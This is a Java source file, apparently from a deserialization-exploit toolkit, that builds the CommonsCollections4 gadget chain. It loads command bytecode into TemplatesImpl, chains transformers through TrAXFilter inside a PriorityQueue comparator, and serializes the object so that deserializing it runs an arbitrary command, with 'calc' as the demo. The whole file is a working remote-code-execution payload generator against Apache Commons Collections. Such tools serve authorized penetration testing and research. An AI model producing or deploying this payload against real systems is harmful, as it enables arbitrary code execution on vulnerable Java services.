package com.exp.collections;




import com.constant.PayloadGenerator;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.File;
import java.lang.reflect.Modifier;
import java.util.PriorityQueue;

public class CommonsCollections4 extends PayloadGenerator {
    public static void main(String[] args) {
        CommonsCollections4 commonsCollections4 = new CommonsCollections4();
        commonsCollections4.generatorPayload(new String[]{"calc"});
    }

    @Override
    protected File generatorPayload(String[] cmd) {
        Templates templates = new TemplatesImpl();
        this.setValueByField("_bytecodes",templates,createClassFile(cmd), Modifier.PRIVATE);
        this.setValueByField("_name",templates,"123",Modifier.PRIVATE);
        this.setValueByField("_tfactory",templates,new TransformerFactoryImpl(), Modifier.PRIVATE);

        Transformer transformers = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });
        TransformingComparator transformingComparator = new TransformingComparator(transformers);
        PriorityQueue queue = new PriorityQueue(transformingComparator);
        queue.add(2);
        setValueByField("size",queue,0, Modifier.PRIVATE);
        queue.add(1);
        setValueByField("size",queue,2, Modifier.PRIVATE);
        return serializable(queue);
    }
}
